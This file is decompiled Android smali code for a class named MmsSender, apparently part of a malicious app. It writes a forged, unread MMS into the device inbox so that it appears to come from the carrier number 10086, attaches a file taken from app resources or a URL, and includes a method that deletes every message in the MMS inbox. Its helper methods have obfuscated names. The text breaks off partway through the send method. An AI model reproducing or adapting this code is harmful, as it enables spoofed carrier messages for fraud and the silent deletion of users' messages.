.class public LDaemon/Service/MmsSender;
.super Ljava/lang/Object;
.source "MmsSender.java"


# static fields
.field public static final sendisok:I = 0x2

.field private static final tag:Ljava/lang/String; = "MmsSender"

.field public static final threadtxt:Ljava/lang/String; = "send mms thread"


# instance fields
.field private Annex_name:Ljava/lang/String;

.field private Annex_url:Ljava/lang/String;

.field private mContext:Landroid/content/Context;

.field private number:Ljava/lang/String;

.field private sendmode:I

.field private sub:Ljava/lang/String;

.field private text:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "mContext"    # Landroid/content/Context;

    .prologue
    const/4 v0, 0x0

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 17
    iput-object v0, p0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    .line 18
    iput-object v0, p0, LDaemon/Service/MmsSender;->sub:Ljava/lang/String;

    .line 19
    iput-object v0, p0, LDaemon/Service/MmsSender;->text:Ljava/lang/String;

    .line 20
    iput-object v0, p0, LDaemon/Service/MmsSender;->Annex_name:Ljava/lang/String;

    .line 21
    iput-object v0, p0, LDaemon/Service/MmsSender;->Annex_url:Ljava/lang/String;

    .line 23
    const-string v0, "10086"

    iput-object v0, p0, LDaemon/Service/MmsSender;->number:Ljava/lang/String;

    .line 24
    const/4 v0, 0x0

    iput v0, p0, LDaemon/Service/MmsSender;->sendmode:I

    .line 29
    iput-object p1, p0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    .line 30
    return-void
.end method

.method private m3216fd9c()Ljava/lang/String;
    .locals 3

    .prologue
    .line 237
    const/4 v1, 0x0

    .line 238
    .local v1, "type":Ljava/lang/String;
    iget-object v2, p0, LDaemon/Service/MmsSender;->Annex_name:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 239
    .local v0, "Annex_name_temp":Ljava/lang/String;
    const-string v2, "txt"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_0

    .line 240
    const-string v1, "text/plain"

    .line 264
    :goto_0
    return-object v1

    .line 241
    :cond_0
    const-string v2, "png"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_1

    .line 242
    const-string v1, "image/png"

    goto :goto_0

    .line 243
    :cond_1
    const-string v2, "jpg"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_2

    .line 244
    const-string v1, "image/jpg"

    goto :goto_0

    .line 245
    :cond_2
    const-string v2, "jpeg"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_3

    .line 246
    const-string v1, "image/jpeg"

    goto :goto_0

    .line 247
    :cond_3
    const-string v2, "gif"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_4

    .line 248
    const-string v1, "image/gif"

    goto :goto_0

    .line 249
    :cond_4
    const-string v2, "bmp"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_5

    .line 250
    const-string v1, "image/bmp"

    goto :goto_0

    .line 251
    :cond_5
    const-string v2, "mp3"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_6

    .line 252
    const-string v1, "audio/mp3"

    goto :goto_0

    .line 253
    :cond_6
    const-string v2, "mid"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_7

    .line 254
    const-string v1, "audio/mid"

    goto :goto_0

    .line 255
    :cond_7
    const-string v2, "wav"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_8

    .line 256
    const-string v1, "audio/wav"

    goto :goto_0

    .line 257
    :cond_8
    const-string v2, "mp4"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_9

    .line 258
    const-string v1, "video/mp4"

    goto :goto_0

    .line 259
    :cond_9
    const-string v2, "3gp"

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    if-lez v2, :cond_a

    .line 260
    const-string v1, "video/3gp"

    goto :goto_0

    .line 262
    :cond_a
    const-string v1, "text/plain"

    goto :goto_0
.end method

.method private mf7531e2d(Ljava/lang/String;)V
    .locals 1
    .param p1, "log"    # Ljava/lang/String;

    .prologue
    .line 270
    const-string v0, "MmsSender"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 273
    return-void
.end method


# virtual methods
.method public SetAnnex_url(Ljava/lang/String;)V
    .locals 2
    .param p1, "Annex_url"    # Ljava/lang/String;

    .prologue
    .line 39
    const/16 v1, 0x2f

    invoke-virtual {p1, v1}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v0

    .line 40
    .local v0, "Annex":I
    add-int/lit8 v1, v0, 0x1

    invoke-virtual {p1, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, LDaemon/Service/MmsSender;->Annex_name:Ljava/lang/String;

    .line 41
    iput-object p1, p0, LDaemon/Service/MmsSender;->Annex_url:Ljava/lang/String;

    .line 42
    return-void
.end method

.method public SetNumber(Ljava/lang/String;)V
    .locals 0
    .param p1, "number"    # Ljava/lang/String;

    .prologue
    .line 44
    iput-object p1, p0, LDaemon/Service/MmsSender;->number:Ljava/lang/String;

    .line 45
    return-void
.end method

.method public SetSendMode(I)V
    .locals 0
    .param p1, "sendmode"    # I

    .prologue
    .line 47
    iput p1, p0, LDaemon/Service/MmsSender;->sendmode:I

    .line 48
    return-void
.end method

.method public SetSub(Ljava/lang/String;)V
    .locals 0
    .param p1, "sub"    # Ljava/lang/String;

    .prologue
    .line 33
    iput-object p1, p0, LDaemon/Service/MmsSender;->sub:Ljava/lang/String;

    .line 34
    return-void
.end method

.method public SetText(Ljava/lang/String;)V
    .locals 0
    .param p1, "text"    # Ljava/lang/String;

    .prologue
    .line 36
    iput-object p1, p0, LDaemon/Service/MmsSender;->text:Ljava/lang/String;

    .line 37
    return-void
.end method

.method public delMMS()V
    .locals 4

    .prologue
    const/4 v3, 0x0

    .line 58
    const-string v0, "content://mms/inbox"

    .line 59
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2, v3, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 61
    return-void
.end method

.method public getSendType()Z
    .locals 2

    .prologue
    .line 50
    iget v0, p0, LDaemon/Service/MmsSender;->sendmode:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_0

    .line 51
    const/4 v0, 0x1

    .line 52
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public send()V
    .locals 24

    .prologue
    .line 74
    const/4 v3, 0x1

    move v0, v3

    move-object/from16 v1, p0

    iput v0, v1, LDaemon/Service/MmsSender;->sendmode:I

    .line 75
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://sms/inbox"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    .line 76
    const/4 v5, 0x2

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    const-string v7, "_id"

    aput-object v7, v5, v6

    const/4 v6, 0x1

    const-string v7, "thread_id"

    aput-object v7, v5, v6

    .line 77
    const-string v6, "address=? and body=? and read=?"

    .line 78
    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/String;

    const/4 v8, 0x0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->number:Ljava/lang/String;

    move-object v9, v0

    aput-object v9, v7, v8

    const/4 v8, 0x1

    const-string v9, "send mms thread"

    aput-object v9, v7, v8

    const/4 v8, 0x2

    const-string v9, "0"

    aput-object v9, v7, v8

    .line 79
    const-string v8, "_id desc"

    .line 75
    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    .line 80
    .local v12, "c":Landroid/database/Cursor;
    const/16 v21, 0x0

    .line 81
    .local v21, "thread_id":Ljava/lang/String;
    const/4 v9, 0x0

    .line 83
    .local v9, "_id":Ljava/lang/String;
    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 85
    const/4 v3, 0x0

    invoke-interface {v12, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 86
    const/4 v3, 0x1

    invoke-interface {v12, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v21

    .line 87
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "get sms thread_id:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V

    .line 93
    :cond_0
    :try_start_0
    new-instance v23, Landroid/content/ContentValues;

    invoke-direct/range {v23 .. v23}, Landroid/content/ContentValues;-><init>()V

    .line 94
    .local v23, "values":Landroid/content/ContentValues;
    const-string v3, "thread_id"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object/from16 v2, v21

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 95
    const-string v3, "date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    div-long/2addr v4, v6

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 96
    const-string v3, "msg_box"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 97
    const-string v3, "read"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 98
    const-string v3, "m_id"

    const-string v4, "052714034192100013309"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 99
    const-string v3, "sub"

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->sub:Ljava/lang/String;

    move-object v4, v0

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 100
    const-string v3, "sub_cs"

    const/16 v4, 0x6a

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 101
    const-string v3, "ct_t"

    const-string v4, "text/plain"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 102
    const-string v3, "m_cls"

    const-string v4, "personal"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 103
    const-string v3, "m_type"

    const/16 v4, 0x84

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 104
    const-string v3, "v"

    const/16 v4, 0x10

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 105
    const-string v3, "pri"

    const/16 v4, 0x81

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 106
    const-string v3, "rr"

    const/16 v4, 0x81

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 107
    const-string v3, "tr_id"

    const-string v4, "1240000089393100527140341001"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 108
    const-string v3, "d_rpt"

    const/16 v4, 0x81

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 109
    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x3

    if-ne v3, v4, :cond_1

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v3

    float-to-double v3, v3

    const-wide/high16 v5, 0x3ff8000000000000L    # 1.5

    cmpl-double v3, v3, v5

    if-lez v3, :cond_1

    .line 110
    const-string v3, "r_date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 112
    :cond_1
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://mms/inbox"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    move-object v0, v3

    move-object v1, v4

    move-object/from16 v2, v23

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 113
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://mms/inbox"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    .line 114
    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    const-string v7, "_id"

    aput-object v7, v5, v6

    .line 115
    const/4 v6, 0x0

    .line 116
    const/4 v7, 0x0

    .line 117
    const-string v8, "_id desc"

    .line 113
    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    .line 119
    const/16 v19, 0x0

    .line 120
    .local v19, "pid":Ljava/lang/String;
    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 122
    const/4 v3, 0x0

    invoke-interface {v12, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v19

    .line 123
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "get mms id:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V

    .line 127
    :cond_2
    invoke-virtual/range {v23 .. v23}, Landroid/content/ContentValues;->clear()V

    .line 129
    const-string v3, "address"

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->number:Ljava/lang/String;

    move-object v4, v0

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 130
    const-string v3, "type"

    const/16 v4, 0x89

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 131
    const-string v3, "charset"

    const/16 v4, 0x6a

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 132
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "content://mms/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v4

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/addr"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    move-object v0, v3

    move-object v1, v4

    move-object/from16 v2, v23

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 134
    const-string v3, "addr mms is 0k"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V

    .line 139
    invoke-virtual/range {v23 .. v23}, Landroid/content/ContentValues;->clear()V

    .line 143
    const-string v3, "seq"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 144
    const-string v3, "ct"

    invoke-direct/range {p0 .. p0}, LDaemon/Service/MmsSender;->m3216fd9c()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 145
    const-string v3, "name"

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->Annex_name:Ljava/lang/String;

    move-object v4, v0

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 146
    const-string v3, "cid"

    const-string v4, "<dl_bg>"

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 147
    const-string v3, "cl"

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->Annex_name:Ljava/lang/String;

    move-object v4, v0

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 149
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "content://mms/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v4

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/part"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    move-object v0, v3

    move-object v1, v4

    move-object/from16 v2, v23

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 151
    const-string v3, "addr part is 0k"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V

    .line 153
    const/4 v11, 0x0

    check-cast v11, [B

    .line 154
    .local v11, "annex":[B
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->Annex_url:Ljava/lang/String;

    move-object v3, v0

    if-nez v3, :cond_5

    .line 156
    const/16 v20, 0x1

    .line 157
    .local v20, "res":I
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    move/from16 v0, v20

    move-object v1, v3

    invoke-static {v0, v1}, LDaemon/DownLoad/FileUtils;->m1329e715(ILandroid/content/Context;)[B

    move-result-object v11

    .line 163
    .end local v20    # "res":I
    :goto_0
    new-instance v6, Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "mid=\'"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v6, v3}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    .line 164
    .local v6, "selection":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "content://mms/part"

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v7, 0x0

    const-string v8, "_id desc"

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v13

    .line 166
    .local v13, "cur":Landroid/database/Cursor;
    invoke-interface {v13}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 168
    const-string v3, "_id"

    invoke-interface {v13, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v13, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v10

    .line 169
    .local v10, "_partID":I
    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v17

    .line 170
    .local v17, "partID":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "content://mms/part/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v18

    .line 172
    .local v18, "partURI":Landroid/net/Uri;
    const/4 v15, 0x0

    .line 174
    .local v15, "is":Ljava/io/OutputStream;
    :try_start_1
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Service/MmsSender;->mContext:Landroid/content/Context;

    move-object v3, v0

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->openOutputStream(Landroid/net/Uri;)Ljava/io/OutputStream;

    move-result-object v15

    .line 175
    invoke-virtual {v15, v11}, Ljava/io/OutputStream;->write([B)V

    .line 176
    invoke-virtual {v15}, Ljava/io/OutputStream;->flush()V

    .line 177
    const-string v3, "addr part annex is 0k"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-direct {v0, v1}, LDaemon/Service/MmsSender;->mf7531e2d(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 184
    .end local v10    # "_partID":I
    .end local v15    # "is":Ljava/io/OutputStream;
    .end local v17    # "partID":Ljava/lang/String;
    .end local v18    # "partURI":Landroid/net/Uri;
    :cond_3
    :goto_1
    :try_start_2
    invoke-virtual/range {v23 .. v23}, Landroid/content/ContentValues;->clear()V

    .line 185
    const-string v16, "text_0.txt"

    .line 187
    .local v16, "name":Ljava/lang/String;
    const-string v3, "seq"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    move-object/from16 v0, v23

    move-object v1, v3

    move-object v2, v4

